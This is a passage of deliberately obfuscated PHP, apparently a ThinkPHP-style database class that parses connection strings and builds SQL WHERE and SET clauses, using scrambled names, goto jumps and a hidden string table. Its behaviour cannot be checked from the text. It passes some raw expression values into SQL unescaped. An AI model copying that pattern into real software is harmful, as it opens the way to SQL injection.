$B·ƒ•‹’Š¢); } } goto Fìöàâ†Œ; D»‘‰ç´ê: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\x6e\x65\161" => "\74\76", "\147\164" => "\76", "\145\x67\x74" => "\x3e\x3d", "\x6c\164" => "\x3c", "\145\154\x74" => "\74\75", "\156\157\164\x6c\151\x6b\145" => "\x4e\x4f\x54\40\114\x49\x4b\x45", "\154\x69\153\145" => "\114\x49\x4b\105", "\151\156" => "\111\116", "\156\x6f\164\151\x6e" => "\x4e\117\124\40\x49\x4e", "\156\157\x74\40\x69\156" => "\116\x4f\x54\40\x49\x4e", "\x62\145\x74\x77\145\x65\x6e" => "\102\105\x54\x57\105\105\x4e", "\x6e\157\x74\x62\145\x74\167\x65\145\156" => "\116\117\124\40\x42\105\124\127\105\x45\116", "\156\x6f\x74\40\142\x65\164\167\145\x65\156" => "\x4e\x4f\124\x20\102\105\x54\x57\105\x45\116"); protected $selectSql = "\123\x45\114\105\x43\x54\45\104\111\123\124\111\x4e\103\124\x25\x20\45\106\x49\x45\114\104\x25\x20\x46\122\x4f\x4d\x20\x25\x54\101\102\x4c\x45\45\x25\112\x4f\x49\x4e\x25\45\127\x48\x45\122\105\45\45\x47\x52\x4f\x55\120\45\45\110\x41\x56\111\116\107\x25\x25\117\122\x44\x45\x52\45\x25\x4c\111\115\x49\124\45\40\45\125\x4e\x49\117\x4e\45\x25\103\117\115\x4d\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $Fê‡°´‘Êñ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÒÆ›ÆØÎ¾][910], $Fê‡°´‘Êñ); } public function factory($f’Ô¸¯¾ĞÛ = '') { goto fïÉÍå¼˜Ï; A®æÚ¶Çº: return $FÄ„Óß„”¬; goto EÜù£Õ¹Íµ; eƒ“™‘ĞŠ: $this->dbType = ucwords(strtolower($f’Ô¸¯¾ĞÛ[$fš£ÈÙ´[911]])); $D¬í£Ã†¹ç = $fš£ÈÙ´[913] . $this->dbType; if (class_exists($D¬í£Ã†¹ç)) { $FÄ„Óß„”¬ = new $D¬í£Ã†¹ç($f’Ô¸¯¾ĞÛ); if ($fš£ÈÙ´[747] != strtolower($f’Ô¸¯¾ĞÛ[$fš£ÈÙ´[911]])) { $FÄ„Óß„”¬->dbType = strtoupper($this->dbType); } else { $FÄ„Óß„”¬->dbType = $this->_getDsnType($f’Ô¸¯¾ĞÛ[$fš£ÈÙ´[866]]); } } else { think_exception(think_lang($fš£ÈÙ´[914]) . $fš£ÈÙ´[915] . $D¬í£Ã†¹ç); } goto A®æÚ¶Çº; fïÉÍå¼˜Ï: $fš£ÈÙ´ =& $_SERVER[ÒÆ›ÆØÎ¾]; $f’Ô¸¯¾ĞÛ = $this->parseConfig($f’Ô¸¯¾ĞÛ); if (empty($f’Ô¸¯¾ĞÛ[$fš£ÈÙ´[911]])) { think_exception(think_lang($fš£ÈÙ´[912])); } goto eƒ“™‘ĞŠ; EÜù£Õ¹Íµ: } public function __call($bŞ¨ØÍôÔæ, $A…Àù¥ ²) { if (method_exists($this, $bŞ¨ØÍôÔæ)) { return call_user_func_array(array($this, $bŞ¨ØÍôÔæ), $A…Àù¥ ²); } } protected function _getDsnType($cÜ‡àÙõá) { $A—†‡‰ô÷í = explode($_SERVER[ÒÆ›ÆØÎ¾][4], $cÜ‡àÙõá); $d®È°Ìà ‹ = strtoupper(trim($A—†‡‰ô÷í[0])); return $d®È°Ìà ‹; } private function parseConfig($E‚ó»˜¯™‘ = '') { $BÕ£•ÌìŠ° =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!empty($E‚ó»˜¯™‘) && is_string($E‚ó»˜¯™‘)) { $E‚ó»˜¯™‘ = $this->parseDSN($E‚ó»˜¯™‘); } elseif (is_array($E‚ó»˜¯™‘)) { $E‚ó»˜¯™‘ = array_change_key_case($E‚ó»˜¯™‘); $E‚ó»˜¯™‘ = array($BÕ£•ÌìŠ°[911] => $E‚ó»˜¯™‘[$BÕ£•ÌìŠ°[746]], $BÕ£•ÌìŠ°[839] => $E‚ó»˜¯™‘[$BÕ£•ÌìŠ°[916]], $BÕ£•ÌìŠ°[840] => $E‚ó»˜¯™‘[$BÕ£•ÌìŠ°[917]], $BÕ£•ÌìŠ°[837] => $E‚ó»˜¯™‘[$BÕ£•ÌìŠ°[918]], $BÕ£•ÌìŠ°[838] => $E‚ó»˜¯™‘[$BÕ£•ÌìŠ°[919]], $BÕ£•ÌìŠ°[17] => $E‚ó»˜¯™‘[$BÕ£•ÌìŠ°[920]], $BÕ£•ÌìŠ°[866] => $E‚ó»˜¯™‘[$BÕ£•ÌìŠ°[748]], $BÕ£•ÌìŠ°[13] => isset($E‚ó»˜¯™‘[$BÕ£•ÌìŠ°[921]]) ? $E‚ó»˜¯™‘[$BÕ£•ÌìŠ°[921]] : array()); } elseif (empty($E‚ó»˜¯™‘)) { if (think_config($BÕ£•ÌìŠ°[922]) && $BÕ£•ÌìŠ°[747] != strtolower(think_config($BÕ£•ÌìŠ°[923]))) { $E‚ó»˜¯™‘ = $this->parseDSN(think_config($BÕ£•ÌìŠ°[922])); } else { $E‚ó»˜¯™‘ = array($BÕ£•ÌìŠ°[911] => think_config($BÕ£•ÌìŠ°[923]), $BÕ£•ÌìŠ°[839] => think_config($BÕ£•ÌìŠ°[924]), $BÕ£•ÌìŠ°[840] => think_config($BÕ£•ÌìŠ°[925]), $BÕ£•ÌìŠ°[837] => think_config($BÕ£•ÌìŠ°[926]), $BÕ£•ÌìŠ°[838] => think_config($BÕ£•ÌìŠ°[927]), $BÕ£•ÌìŠ°[17] => think_config($BÕ£•ÌìŠ°[244]), $BÕ£•ÌìŠ°[866] => think_config($BÕ£•ÌìŠ°[922]), $BÕ£•ÌìŠ°[13] => think_config($BÕ£•ÌìŠ°[928])); } } return $E‚ó»˜¯™‘; } protected function initConnect($bøÆÙ¦¨¿Œ = true) { if (1 == think_config($_SERVER[ÒÆ›ÆØÎ¾][18])) { $this->_linkID = $this->multiConnect($bøÆÙ¦¨¿Œ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $cØ’¢©Š¹ => $D©ˆÈæÑ§³) { $this->_linkID = $D©ˆÈæÑ§³; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($EÕòí¤ŒØ = false) { goto EœˆéŒ‘Ü¡; a¥ƒäç­¦Ó: $Eîàğ£Ø«õ = array($a¡¥°¼…Âˆ[839] => isset($dãö¡Á©…ì[$a¡¥°¼…Âˆ[839]][$b¾ÏÌ¿Á×]) ? $dãö¡Á©…ì[$a¡¥°¼…Âˆ[839]][$b¾ÏÌ¿Á×] : $dãö¡Á©…ì[$a¡¥°¼…Âˆ[839]][0], $a¡¥°¼…Âˆ[840] => isset($dãö¡Á©…ì[$a¡¥°¼…Âˆ[840]][$b¾ÏÌ¿Á×]) ? $dãö¡Á©…ì[$a¡¥°¼…Âˆ[840]][$b¾ÏÌ¿Á×] : $dãö¡Á©…ì[$a¡¥°¼…Âˆ[840]][0], $a¡¥°¼…Âˆ[837] => isset($dãö¡Á©…ì[$a¡¥°¼…Âˆ[837]][$b¾ÏÌ¿Á×]) ? $dãö¡Á©…ì[$a¡¥°¼…Âˆ[837]][$b¾ÏÌ¿Á×] : $dãö¡Á©…ì[$a¡¥°¼…Âˆ[837]][0], $a¡¥°¼…Âˆ[838] => isset($dãö¡Á©…ì[$a¡¥°¼…Âˆ[838]][$b¾ÏÌ¿Á×]) ? $dãö¡Á©…ì[$a¡¥°¼…Âˆ[838]][$b¾ÏÌ¿Á×] : $dãö¡Á©…ì[$a¡¥°¼…Âˆ[838]][0], $a¡¥°¼…Âˆ[17] => isset($dãö¡Á©…ì[$a¡¥°¼…Âˆ[17]][$b¾ÏÌ¿Á×]) ? $dãö¡Á©…ì[$a¡¥°¼…Âˆ[17]][$b¾ÏÌ¿Á×] : $dãö¡Á©…ì[$a¡¥°¼…Âˆ[17]][0], $a¡¥°¼…Âˆ[866] => isset($dãö¡Á©…ì[$a¡¥°¼…Âˆ[866]][$b¾ÏÌ¿Á×]) ? $dãö¡Á©…ì[$a¡¥°¼…Âˆ[866]][$b¾ÏÌ¿Á×] : $dãö¡Á©…ì[$a¡¥°¼…Âˆ[866]][0], $a¡¥°¼…Âˆ[13] => isset($dãö¡Á©…ì[$a¡¥°¼…Âˆ[13]][$b¾ÏÌ¿Á×]) ? $dãö¡Á©…ì[$a¡¥°¼…Âˆ[13]][$b¾ÏÌ¿Á×] : $dãö¡Á©…ì[$a¡¥°¼…Âˆ[13]][0]); return $this->connect($Eîàğ£Ø«õ, $b¾ÏÌ¿Á×); goto CĞ‹Ö‚š¬Ä; EœˆéŒ‘Ü¡: $a¡¥°¼…Âˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; static $dãö¡Á©…ì = array(); static $CÙ¾Œ°ª™… = -1; goto a•ÆŠ§‹¥; a•ÆŠ§‹¥: if (empty($dãö¡Á©…ì)) { foreach ($this->config as $D›•Ôòğ¶ => $Aİ­Æ«Ò“¦) { $dãö¡Á©…ì[$D›•Ôòğ¶] = explode($a¡¥°¼…Âˆ[47], $Aİ­Æ«Ò“¦); } } if (think_config($a¡¥°¼…Âˆ[929])) { if ($EÕòí¤ŒØ) { $b¾ÏÌ¿Á× = floor(mt_rand(0, think_config($a¡¥°¼…Âˆ[930]) - 1)); $CÙ¾Œ°ª™… = $b¾ÏÌ¿Á×; } else { if (is_numeric(think_config($a¡¥°¼…Âˆ[931]))) { $b¾ÏÌ¿Á× = think_config($a¡¥°¼…Âˆ[931]); } else { $b¾ÏÌ¿Á× = floor(mt_rand(think_config($a¡¥°¼…Âˆ[930]), count($dãö¡Á©…ì[$a¡¥°¼…Âˆ[837]]) - 1)); } } } else { $b¾ÏÌ¿Á× = floor(mt_rand(0, count($dãö¡Á©…ì[$a¡¥°¼…Âˆ[837]]) - 1)); $CÙ¾Œ°ª™… = $b¾ÏÌ¿Á×; } $b¾ÏÌ¿Á× = $CÙ¾Œ°ª™… !== -1 ? $CÙ¾Œ°ª™… : $b¾ÏÌ¿Á×; goto a¥ƒäç­¦Ó; CĞ‹Ö‚š¬Ä: } public function parseDSN($a¿öµâ‡) { $d˜ª­¼õÒØ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($a¿öµâ‡)) { return !1; } $CÖù®ğŸçí = parse_url($a¿öµâ‡); if ($CÖù®ğŸçí[$d˜ª­¼õÒØ[174]]) { $CÚç·×›İ« = array($d˜ª­¼õÒØ[911] => $CÖù®ğŸçí[$d˜ª­¼õÒØ[174]], $d˜ª­¼õÒØ[839] => isset($CÖù®ğŸçí[$d˜ª­¼õÒØ[562]]) ? $CÖù®ğŸçí[$d˜ª­¼õÒØ[562]] : $d˜ª­¼õÒØ[33], $d˜ª­¼õÒØ[840] => isset($CÖù®ğŸçí[$d˜ª­¼õÒØ[932]]) ? $CÖù®ğŸçí[$d˜ª­¼õÒØ[932]] : $d˜ª­¼õÒØ[33], $d˜ª­¼õÒØ[837] => isset($CÖù®ğŸçí[$d˜ª­¼õÒØ[175]]) ? $CÖù®ğŸçí[$d˜ª­¼õÒØ[175]] : $d˜ª­¼õÒØ[33], $d˜ª­¼õÒØ[838] => isset($CÖù®ğŸçí[$d˜ª­¼õÒØ[176]]) ? $CÖù®ğŸçí[$d˜ª­¼õÒØ[176]] : $d˜ª­¼õÒØ[33], $d˜ª­¼õÒØ[17] => isset($CÖù®ğŸçí[$d˜ª­¼õÒØ[76]]) ? substr($CÖù®ğŸçí[$d˜ª­¼õÒØ[76]], 1) : $d˜ª­¼õÒØ[33]); } else { preg_match($d˜ª­¼õÒØ[933], trim($a¿öµâ‡), $dÏØİ¦ÛÌ¬); $CÚç·×›İ« = array($d˜ª­¼õÒØ[911] => $dÏØİ¦ÛÌ¬[1], $d˜ª­¼õÒØ[839] => $dÏØİ¦ÛÌ¬[2], $d˜ª­¼õÒØ[840] => $dÏØİ¦ÛÌ¬[3], $d˜ª­¼õÒØ[837] => $dÏØİ¦ÛÌ¬[4], $d˜ª­¼õÒØ[838] => $dÏØİ¦ÛÌ¬[5], $d˜ª­¼õÒØ[17] => $dÏØİ¦ÛÌ¬[6]); } $CÚç·×›İ«[$d˜ª­¼õÒØ[866]] = $d˜ª­¼õÒØ[33]; return $CÚç·×›İ«; } protected function debug() { $AËğ†÷½ÌÀ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $AËğ†÷½ÌÀ[934]; if (think_config($AËğ†÷½ÌÀ[935])) { think_status($AËğ†÷½ÌÀ[936]); think_trace($this->queryStr . $AËğ†÷½ÌÀ[937] . think_status($AËğ†÷½ÌÀ[20], $AËğ†÷½ÌÀ[936], 6) . $AËğ†÷½ÌÀ[938], $AËğ†÷½ÌÀ[33], $AËğ†÷½ÌÀ[939]); } } protected function parseLock($FåÔ’Í„Ñ = false) { $Dî§ïß³´¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$FåÔ’Í„Ñ) { return $Dî§ïß³´¦[33]; } if ($Dî§ïß³´¦[868] == $this->dbType) { return $Dî§ïß³´¦[940]; } return $Dî§ïß³´¦[941]; } protected function parseSet($aª‘¹Ó ¼í) { $B¹¿‡À¶†Ñ =& $_SERVER[ÒÆ›ÆØÎ¾]; foreach ($aª‘¹Ó ¼í as $cñ»Õ“µ¾ä => $f ¿³Æ‚) { if (is_array($f ¿³Æ‚) && $B¹¿‡À¶†Ñ[295] == $f ¿³Æ‚[0]) { $E±ØäøÌë‹[] = $this->parseKey($cñ»Õ“µ¾ä) . $B¹¿‡À¶†Ñ[942] . $f ¿³Æ‚[1]; } elseif (is_scalar($f ¿³Æ‚) || is_null($f ¿³Æ‚)) { $E±ØäøÌë‹[] = $this->parseKey($cñ»Õ“µ¾ä) . $B¹¿‡À¶†Ñ[942] . $this->parseValue($f ¿³Æ‚); } } return $B¹¿‡À¶†Ñ[943] . implode($B¹¿‡À¶†Ñ[47], $E±ØäøÌë‹); } protected function bindParam($EÈºÔ‚„ùÕ, $c¿ïòÅŞ) { $this->bind[$_SERVER[ÒÆ›ÆØÎ¾][4] . $EÈºÔ‚„ùÕ] = $c¿ïòÅŞ; } protected function parseBind($e…¸À®ªƒ³) { $e…¸À®ªƒ³ = array_merge($this->bind, $e…¸À®ªƒ³); $this->bind = array(); return $e…¸À®ªƒ³; } function parseKey(&$fÆêš²©Ïˆ, $aˆ‰Š»¶ = true) { if ($aˆ‰Š»¶) { $fÆêš²©Ïˆ = $this->parseKeyCheck($fÆêš²©Ïˆ); } return $fÆêš²©Ïˆ; } function parseKeyCheck($D²ªæõ¿) { $d†Ëƒ‰—ù =& $_SERVER[ÒÆ›ÆØÎ¾]; $D²ªæõ¿ = trim($D²ªæõ¿); if (!preg_match($d†Ëƒ‰—ù[944], $D²ªæõ¿)) { think_exception($d†Ëƒ‰—ù[945] . $D²ªæõ¿); } return $D²ªæõ¿; } protected function parseValue($CŞŠáÃ®¤) { $dŒé§õâ©© =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_string($CŞŠáÃ®¤)) { $CŞŠáÃ®¤ = $dŒé§õâ©©[907] . $this->escapeString($CŞŠáÃ®¤) . $dŒé§õâ©©[907]; } elseif (isset($CŞŠáÃ®¤[0]) && is_string($CŞŠáÃ®¤[0]) && strtolower($CŞŠáÃ®¤[0]) == $dŒé§õâ©©[295]) { $CŞŠáÃ®¤ = $this->escapeString($CŞŠáÃ®¤[1]); } elseif (is_array($CŞŠáÃ®¤)) { $CŞŠáÃ®¤ = array_map(array($this, $dŒé§õâ©©[908]), $CŞŠáÃ®¤); } elseif (is_bool($CŞŠáÃ®¤)) { $CŞŠáÃ®¤ = $CŞŠáÃ®¤ ? $dŒé§õâ©©[87] : $dŒé§õâ©©[191]; } elseif (is_null($CŞŠáÃ®¤)) { $CŞŠáÃ®¤ = $dŒé§õâ©©[103]; } return $CŞŠáÃ®¤; } protected function parseField($dØ–‚•½ÕŠ) { $Dö•¹›™¿ƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_string($dØ–‚•½ÕŠ) && strpos($dØ–‚•½ÕŠ, $Dö•¹›™¿ƒ[47])) { $dØ–‚•½ÕŠ = explode($Dö•¹›™¿ƒ[47], $dØ–‚•½ÕŠ); } if (is_array($dØ–‚•½ÕŠ)) { $F¦á¿ëç“  = array(); foreach ($dØ–‚•½ÕŠ as $e¯ÕÙ¡ò¸’ => $cÈÛø¥ô”ƒ) { if (!is_numeric($e¯ÕÙ¡ò¸’)) { $F¦á¿ëç“ [] = $this->parseKey($e¯ÕÙ¡ò¸’, !1) . $Dö•¹›™¿ƒ[946] . $this->parseKey($cÈÛø¥ô”ƒ); } else { $F¦á¿ëç“ [] = $this->parseKey($cÈÛø¥ô”ƒ); } } $d‹«óó±Ñá = implode($Dö•¹›™¿ƒ[47], $F¦á¿ëç“ ); } elseif (is_string($dØ–‚•½ÕŠ) && !empty($dØ–‚•½ÕŠ)) { $d‹«óó±Ñá = $dØ–‚•½ÕŠ; } else { $d‹«óó±Ñá = $Dö•¹›™¿ƒ[182]; } return $d‹«óó±Ñá; } protected function parseTable($cÎáäò½¤Æ) { $E¸½ÚôšÇæ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_array($cÎáäò½¤Æ)) { $B¦‹Œ•¦ğ = array(); foreach ($cÎáäò½¤Æ as $fÈÕê½ÀÛ¨ => $Bæ‰‰Éóò) { if (!is_numeric($fÈÕê½ÀÛ¨)) { $B¦‹Œ•¦ğ[] = $this->parseKey($fÈÕê½ÀÛ¨) . $E¸½ÚôšÇæ[50] . $this->parseKey($Bæ‰‰Éóò); } else { $B¦‹Œ•¦ğ[] = $this->parseKey($fÈÕê½ÀÛ¨); } } $cÎáäò½¤Æ = $B¦‹Œ•¦ğ; } elseif (is_string($cÎáäò½¤Æ)) { if (strstr($cÎáäò½¤Æ, $E¸½ÚôšÇæ[50])) { return $cÎáäò½¤Æ; } $cÎáäò½¤Æ = explode($E¸½ÚôšÇæ[47], $cÎáäò½¤Æ); array_walk($cÎáäò½¤Æ, array($this, $E¸½ÚôšÇæ[857])); } return $E¸½ÚôšÇæ[851] . trim(implode($E¸½ÚôšÇæ[947], $cÎáäò½¤Æ), $E¸½ÚôšÇæ[382]) . $E¸½ÚôšÇæ[851]; } protected function parseWhere($dí‰¿Û©â†) { $A†‘ì‡¶ÆÂ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fˆ†ïçíÉ = $A†‘ì‡¶ÆÂ[33]; if (is_string($dí‰¿Û©â†)) { $fˆ†ïçíÉ = $dí‰¿Û©â†; } else { $A¸µÊÔåÅô = isset($dí‰¿Û©â†[$A†‘ì‡¶ÆÂ[948]]) ? strtoupper($dí‰¿Û©â†[$A†‘ì‡¶ÆÂ[948]]) : $A†‘ì‡¶ÆÂ[33]; if (in_array($A¸µÊÔåÅô, array($A†‘ì‡¶ÆÂ[949], $A†‘ì‡¶ÆÂ[950], $A†‘ì‡¶ÆÂ[951]))) { $A¸µÊÔåÅô = $A†‘ì‡¶ÆÂ[50] . $A¸µÊÔåÅô . $A†‘ì‡¶ÆÂ[50]; unset($dí‰¿Û©â†[$A†‘ì‡¶ÆÂ[948]]); } else { $A¸µÊÔåÅô = $A†‘ì‡¶ÆÂ[952]; } foreach ($dí‰¿Û©â† as $D¯Ú„¿ÎÒ => $D¯ÆÑ´ºø¡) { $fˆ†ïçíÉ .= $A†‘ì‡¶ÆÂ[275]; if (is_numeric($D¯Ú„¿ÎÒ)) { $D¯Ú„¿ÎÒ = $A†‘ì‡¶ÆÂ[953]; } if (0 === strpos($D¯Ú„¿ÎÒ, $A†‘ì‡¶ÆÂ[71])) { $fˆ†ïçíÉ .= $this->parseThinkWhere($D¯Ú„¿ÎÒ, $D¯ÆÑ´ºø¡); } else { if (!preg_match($A†‘ì‡¶ÆÂ[954], trim($D¯Ú„¿ÎÒ))) { think_exception(think_lang($A†‘ì‡¶ÆÂ[955]) . $A†‘ì‡¶ÆÂ[4] . $D¯Ú„¿ÎÒ); } $fî÷òëÖä³ = is_array($D¯ÆÑ´ºø¡) && isset($D¯ÆÑ´ºø¡[$A†‘ì‡¶ÆÂ[956]]); $D¯Ú„¿ÎÒ = trim($D¯Ú„¿ÎÒ); if (strpos($D¯Ú„¿ÎÒ, $A†‘ì‡¶ÆÂ[281])) { $dŒè§ƒ©øœ = explode($A†‘ì‡¶ÆÂ[281], $D¯Ú„¿ÎÒ); $EÒ¹ÌËÜ = array(); foreach ($dŒè§ƒ©øœ as $dŒ ŒËŠ¸ => $Fë¯â†ç˜¦) { $B ±ÂêÉâ = $fî÷òëÖä³ ? $D¯ÆÑ´ºø¡[$dŒ ŒËŠ¸] : $D¯ÆÑ´ºø¡; $EÒ¹ÌËÜ[] = $A†‘ì‡¶ÆÂ[258] . $this->parseWhereItem($this->parseKey($Fë¯â†ç˜¦), $B ±ÂêÉâ) . $A†‘ì‡¶ÆÂ[856]; } $fˆ†ïçíÉ .= implode($A†‘ì‡¶ÆÂ[957], $EÒ¹ÌËÜ); } elseif (strpos($D¯Ú„¿ÎÒ, $A†‘ì‡¶ÆÂ[282])) { $dŒè§ƒ©øœ = explode($A†‘ì‡¶ÆÂ[282], $D¯Ú„¿ÎÒ); $EÒ¹ÌËÜ = array(); foreach ($dŒè§ƒ©øœ as $dŒ ŒËŠ¸ => $Fë¯â†ç˜¦) { $B ±ÂêÉâ = $fî÷òëÖä³ ? $D¯ÆÑ´ºø¡[$dŒ ŒËŠ¸] : $D¯ÆÑ´ºø¡; $EÒ¹ÌËÜ[] = $A†‘ì‡¶ÆÂ[258] . $this->parseWhereItem($this->parseKey($Fë¯â†ç˜¦), $B ±ÂêÉâ) . $A†‘ì‡¶ÆÂ[856]; } $fˆ†ïçíÉ .= implode($A†‘ì‡¶ÆÂ[952], $EÒ¹ÌËÜ); } else { $fˆ†ïçíÉ .= $this->parseWhereItem($this->parseKey($D¯Ú„¿ÎÒ), $D¯ÆÑ´ºø¡); } } $fˆ†ïçíÉ .= $A†‘ì‡¶ÆÂ[276] . $A¸µÊÔåÅô; } $fˆ†ïçíÉ = substr($fˆ†ïçíÉ, 0, -strlen($A¸µÊÔåÅô)); } return empty($fˆ†ïçíÉ) ? $A†‘ì‡¶ÆÂ[33] : $A†‘ì‡¶ÆÂ[958] . $fˆ†ïçíÉ; } protected function parseWhereItem($f”¹ƒ–²•Ñ, $D£–ÇìËèÀ) { $A¦¡Å¬â†ö =& $_SERVER[ÒÆ›ÆØÎ¾]; $eù·òñø×¿ = $A¦¡Å¬â†ö[33]; if (is_array($D£–ÇìËèÀ)) { if (is_string($D£–ÇìËèÀ[0])) { $Fí§ö”êç× = strtolower($D£–ÇìËèÀ[0]); if (in_array($D£–ÇìËèÀ[0], array($A¦¡Å¬â†ö[942], $A¦¡Å¬â†ö[959], $A¦¡Å¬â†ö[960], $A¦¡Å¬â†ö[961], $A¦¡Å¬â†ö[962], $A¦¡Å¬â†ö[963]))) { $eù·òñø×¿ .= $f”¹ƒ–²•Ñ . $A¦¡Å¬â†ö[50] . $D£–ÇìËèÀ[0] . $A¦¡Å¬â†ö[50] . $this->parseValue($D£–ÇìËèÀ[1]); } elseif (preg_match($A¦¡Å¬â†ö[964], $D£–ÇìËèÀ[0])) { $eù·òñø×¿ .= $f”¹ƒ–²•Ñ . $A¦¡Å¬â†ö[50] . $this->exp[$Fí§ö”êç×] . $A¦¡Å¬â†ö[50] . $this->parseValue($D£–ÇìËèÀ[1]); } elseif (preg_match($A¦¡Å¬â†ö[965], $D£–ÇìËèÀ[0])) { if (is_array($D£–ÇìËèÀ[1])) { $c‹î÷±ƒÌŠ = isset($D£–ÇìËèÀ[2]) ? strtoupper($D£–ÇìËèÀ[2]) : $A¦¡Å¬â†ö[950]; if (in_array($c‹î÷±ƒÌŠ, array($A¦¡Å¬â†ö[949], $A¦¡Å¬â†ö[950], $A¦¡Å¬â†ö[951]))) { $FÑ®•Æ‡ğø = array(); foreach ($D£–ÇìËèÀ[1] as $aí‘×Š±ƒã) { $FÑ®•Æ‡ğø[] = $f”¹ƒ–²•Ñ . $A¦¡Å¬â†ö[50] . $this->exp[$Fí§ö”êç×] . $A¦¡Å¬â†ö[50] . $this->parseValue($aí‘×Š±ƒã); } $eù·òñø×¿ .= $A¦¡Å¬â†ö[258] . implode($A¦¡Å¬â†ö[50] . $c‹î÷±ƒÌŠ . $A¦¡Å¬â†ö[50], $FÑ®•Æ‡ğø) . $A¦¡Å¬â†ö[856]; } } else { $eù·òñø×¿ .= $f”¹ƒ–²•Ñ . $A¦¡Å¬â†ö[50] . $this->exp[$Fí§ö”êç×] . $A¦¡Å¬â†ö[50] . $this->parseValue($D£–ÇìËèÀ[1]); } } elseif ($A¦¡Å¬â†ö[295] == $Fí§ö”êç×) { $eù·òñø×¿ .= $A¦¡Å¬â†ö[854] . $f”¹ƒ–²•Ñ . $A¦¡Å¬â†ö[50] . $D£–ÇìËèÀ[1] . $A¦¡Å¬â†ö[966]; } elseif (preg_match($A¦¡Å¬â†ö[967], $D£–ÇìËèÀ[0])) { $eù·òñø×¿ .= $D£–ÇìËèÀ[0]; } elseif (preg_match($A¦¡Å¬â†ö[968], $D£–ÇìËèÀ[0])) { if (isset($D£–ÇìËèÀ[2]) && $A¦¡Å¬â†ö[295] == $D£–ÇìËèÀ[2]) { $eù·òñø×¿ .= $f”¹ƒ–²•Ñ . $A¦¡Å¬â†ö[50] . $this->exp[$Fí§ö”êç×] . $A¦¡Å¬â†ö[50] . $D£–ÇìËèÀ[1]; } else { if (is_string($D£–ÇìËèÀ[1])) { $D£–ÇìËèÀ[1] = explode($A¦¡Å¬â†ö[47], $D£–ÇìËèÀ[1]); } $A¢¦ˆìÀ³ = implode($A¦¡Å¬â†ö[47], $this->parseValue($D£–ÇìËèÀ[1])); $eù·òñø×¿ .= $f”¹ƒ–²•Ñ . $A¦¡Å¬â†ö[50] . $this->exp[$Fí§ö”êç×] . $A¦¡Å¬â†ö[854] . $A¢¦ˆìÀ³ . $A¦¡Å¬â†ö[856]; } } elseif (preg_match($A¦¡Å¬â†ö[969], $D£–ÇìËèÀ[0])) { $Fí¿©ñ µ = is_string($D£–ÇìËèÀ[1]) ? explode($A¦¡Å¬â†ö[47], $D£–ÇìËèÀ[1]) : $D£–ÇìËèÀ[1]; $eù·òñø×¿ .= $A¦¡Å¬â†ö[854] . $f”¹ƒ–²•Ñ . $A¦¡Å¬â†ö[50] . $this->exp[$Fí§ö”êç×] . $A¦¡Å¬â†ö[50] . $this->parseValue($Fí¿©ñ µ[0]) . $A¦¡Å¬â†ö[952] . $this->parseValue($Fí¿©ñ µ[1]) . $A¦¡Å¬â†ö[276]; } else { think_exception(think_lang($A¦¡Å¬â†ö[955]) . $A¦¡Å¬â†ö[4] . $D£–ÇìËèÀ[0]); } } else { $b»ÖÕ›óéµ = count($D£–ÇìËèÀ); $F¥˜÷ƒö„ã = $A¦¡Å¬â†ö[33]; if (is_string($D£–ÇìËèÀ[$b»ÖÕ›óéµ - 1])) { $F¥˜÷ƒö„ã = isset($D£–ÇìËèÀ[$b»ÖÕ›óéµ - 1]) ? strtoupper($D£–ÇìËèÀ[$b»ÖÕ›óéµ - 1]) : $A¦¡Å¬â†ö[33]; if (in_array($F¥˜÷ƒö„ã, array($A¦¡Å¬â†ö[949], $A¦¡Å¬â†ö[950], $A¦¡Å¬â†ö[951]))) { $b»ÖÕ›óéµ = $b»ÖÕ›óéµ - 1; } } else { $F¥˜÷ƒö„ã = $A¦¡Å¬â†ö[949]; } for ($dƒà¥†ëÚñ = 0; $dƒà¥†ëÚñ < $b»ÖÕ›óéµ; $dƒà¥†ëÚñ++) { $Fí¿©ñ µ = is_array($D£–ÇìËèÀ[$dƒà¥†ëÚñ]) ? $D£–ÇìËèÀ[$dƒà¥†ëÚñ][1] : $D£–ÇìËèÀ[$dƒà¥†ëÚñ]; if ($A¦¡Å¬â†ö[295] == strtolower($D£–ÇìËèÀ[$dƒà¥†ëÚñ][0])) { $eù·òñø×¿ .= $A¦¡Å¬â†ö[258] . $f”¹ƒ–²•Ñ . $A¦¡Å¬â†ö[50] . $Fí¿©ñ µ . $A¦¡Å¬â†ö[966] . $F¥˜÷ƒö„ã . $A¦¡Å¬â†ö[50]; } else { $AÏŠÏ±ã´‘ = is_array($D£–ÇìËèÀ[$dƒà¥†ëÚñ]) ? $this->exp[strtolower($D£–ÇìËèÀ[$dƒà¥†ëÚñ][0])] : $A¦¡Å¬â†ö[942]; if (!$AÏŠÏ±ã´‘ && is_array($D£–ÇìËèÀ[$dƒà¥†ëÚñ]) && in_array($D£–ÇìËèÀ[$dƒà¥†ëÚñ][0], array($A¦¡Å¬â†ö[942], $A¦¡Å¬â†ö[959], $A¦¡Å¬â†ö[960], $A¦¡Å¬â†ö[961], $A¦¡Å¬â†ö[962], $A¦¡Å¬â†ö[963]))) { $AÏŠÏ±ã´‘ = $D£–ÇìËèÀ[$dƒà¥†ëÚñ][0]; } $eù·òñø×¿ .= $A¦¡Å¬â†ö[258] . $f”¹ƒ–²•Ñ . 